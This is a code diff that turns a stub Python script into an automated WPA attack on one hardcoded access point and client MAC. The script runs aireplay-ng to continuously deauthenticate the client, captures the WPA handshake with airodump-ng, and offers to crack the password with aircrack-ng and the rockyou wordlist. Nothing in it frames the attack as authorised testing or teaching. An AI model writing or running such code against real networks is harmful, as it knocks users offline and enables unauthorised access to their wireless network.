@@ -1,45 +1,75 @@
 import subprocess
-from prettytable import PrettyTable
-import csv
+import signal
+import sys
+import time
+import shutil
 
-def target_ap():
-    display_access_points()
-    return "target_ap test"
+deauth_process = None  # Global variable to keep track of the deauth subprocess
 
-def target_c():
-    return "target_c test"
-
-def identify_clients():
-    pass
-
-def deauth(ap_mac, c_mac):
+def dump(ap_mac, channel):
+    global deauth_process
     try:
-        command = ["aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, "wlan0mon"]
-        subprocess.run(command, check=True)
-    except KeyboardInterrupt:
-        print("\nDeauthentication interrupted")
-    except subprocess.CalledProcessError as e:
-        print(f"An error occurred while executing aireplay-ng: {e}")
-
-def crack_handshake():
-    pass
-
-def display_access_points():
-    file_path = "/mnt/data/access_points.txt"
-    # Initialize the PrettyTable with the specified headers
-    table = PrettyTable(["ESSID", "ENC", "BSSID"])
-
-    try:
-        # Open the file and read the contents using the csv.reader for parsing CSV formatted data
-        with open(file_path, mode='r') as file:
-            csv_reader = csv.reader(file)
-            next(csv_reader)  # Skip the header row
-            for row in csv_reader:
-                bssid, enc, essid = row  # Unpack the row directly into variables
-                table.add_row([essid, enc, bssid])  # Add the data to the table
-
-        print(table)  # Display the table
-    except FileNotFoundError:
-        print(f"The file {file_path} was not found.")
+        print("Starting packet capture on AP with BSSID:", ap_mac)
+        # Initiate packet capture
+        subprocess.run(["sudo", "airodump-ng", "wlan0mon", "--bssid", ap_mac, "-c", str(channel), "-w", "/mnt/data/wpa_attack"])
     except Exception as e:
-        print(f"An error occurred while reading the file: {e}")
+        print("Failed to start dump:", e)
+    finally:
+        if deauth_process:
+            deauth_process.terminate()  # Terminate deauth process when dump is done or fails
+
+def deauth(ap_mac, c_mac, interface):
+    try:
+        print("Starting deauthentication attack on client with MAC:", c_mac)
+        # Start the deauth process in the background
+        global deauth_process
+        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, interface])
+    except Exception as e:
+        print("Failed to start deauth:", e)
+
+def crack():
+    try:
+        print("Attempting to crack WPA password...")
+        subprocess.run(["sudo", "aircrack-ng", "/mnt/data/wpa_attack-01.cap", "-w", "/usr/share/wordlists/rockyou.txt"])
+    except Exception as e:
+        print("Failed to start crack:", e)
+
+def signal_handler(sig, frame):
+    global deauth_process
+    if deauth_process:
+        deauth_process.terminate()  # Ensure deauth process is terminated on Ctrl+C
+    print('Operation canceled by user.')
+    sys.exit(0)
+
+def move_cap_file():
+    try:
+        shutil.move("./wpa_attack-01.cap", "/mnt/data/wpa_attack-01.cap")
+        print(".cap file moved to /mnt/data/")
+    except Exception as e:
+        print("Failed to move .cap file:", e)
+
+def main():
+    ap_mac = "18:1B:EB:FC:B0:74"
+    channel = "6"  # Channel should be a string as it's passed directly to subprocess commands
+    interface = "wlan0mon"
+    c_mac = "10:F6:0A:7A:8C:94"  # Example client MAC address; replace with actual target
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    # Start deauth attack in the background
+    deauth(ap_mac, c_mac, interface)
+    
+    print("Collecting packets, press Ctrl+C to stop...")
+    try:
+        dump(ap_mac, channel)
+    except KeyboardInterrupt:
+        move_cap_file()
+        user_decision = input("\nPacket capture interrupted. Do you want to attempt to crack the WPA password? (y/n): ")
+        if user_decision.lower() == 'y':
+            print("Proceeding to crack the WPA password...")
+            crack()
+        else:
+            print("Operation aborted by the user.")
+
+if __name__ == "__main__":
+    main()
